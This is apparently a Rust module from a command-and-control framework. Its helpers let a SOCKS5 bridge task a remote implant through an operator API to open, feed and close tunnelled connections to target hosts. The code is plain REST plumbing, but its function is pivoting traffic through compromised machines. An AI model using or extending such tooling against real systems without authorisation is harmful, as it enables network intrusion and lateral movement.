//! Async REST helpers for the SOCKS5 bridge — a small, self-contained set that
//! talks to the operator control API (`POST /api/task`, `GET /api/results`).
//!
//! These mirror the private helpers in [`crate::rest`] (which are owned by the
//! TUI worker thread and unshareable), but are PUBLIC and owned by the bridge
//! so the headless `socks` subcommand — running on its own runtime — can drive
//! the channel lifecycle. They reuse [`nyx_rest`] types + [`nyx_rest::authed`]
//! rather than redefining them, per the [[nyx-duplicate-parser-hazard]] rule.
//!
//! Channel command contract (server `JsonCommand`, server/src/lib.rs ~780-848):
//! - `{type:"connect",host,port}` → server allocates the chan id (returned in
//!   `TaskAck.chan`) at enqueue time. This is the bridge's open primitive.
//! - `{type:"channeldata",chan,data_hex}` → operator→target bytes.
//! - `{type:"channelclose",chan}` → explicit teardown (implant auto-closes on
//!   socket EOF too, so this is belt-and-suspenders).

use anyhow::Result;
use nyx_rest::{authed, ResultView, TaskAck};

/// POST `{type:"connect",host,port}`. Returns `(task_id, chan)` where `chan` is
/// the server-allocated channel id (read from `TaskAck.chan`). The implant
/// socket is NOT open yet — that arrives later as a `kind:"channel"` status:0
/// row in `/api/results` once the beacon runs the Connect task next cycle.
pub async fn enqueue_connect(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    host: &str,
    port: u16,
    token: &Option<String>,
) -> Result<(u64, u32)> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "connect", "host": host, "port": port }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    let chan = ack
        .chan
        .ok_or_else(|| anyhow::anyhow!("server returned no chan for connect (old server?)"))?;
    Ok((ack.task_id, chan))
}

/// POST `{type:"channeldata",chan,data_hex}` — ferry operator→target bytes.
/// Fire-and-forget; the implant acks with `Response::Ok` (ignored by the poll
/// loop). A failure here (network blip / 503 queue-full) is surfaced to the
/// caller, which treats repeated failure as a dead channel.
pub async fn enqueue_channel_data(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    chan: u32,
    data: &[u8],
    token: &Option<String>,
) -> Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "channeldata", "chan": chan, "data_hex": hex::encode(data) }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

/// POST `{type:"channelclose",chan}` — explicit teardown. Idempotent
/// (implant's `channel_close` is a no-op on an unknown chan).
pub async fn enqueue_channel_close(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    chan: u32,
    token: &Option<String>,
) -> Result<()> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "channelclose", "chan": chan }
    });
    let _: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(())
}

/// `GET /api/results?session=<hex>` — DRAINS the session's result queue
/// server-side. The bridge MUST be the sole consumer of this endpoint for its
/// session (a second concurrent consumer would race on the drain and silently
/// lose rows). That invariant is why the SOCKS bridge is a separate headless
/// subcommand, not an in-TUI task.
pub async fn fetch_channel_results(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    token: &Option<String>,
) -> Result<Vec<ResultView>> {
    Ok(authed(
        c.get(format!("{server}/api/results"))
            .query(&[("session", session)]),
        token,
    )
    .send()
    .await?
    .json()
    .await?)
}
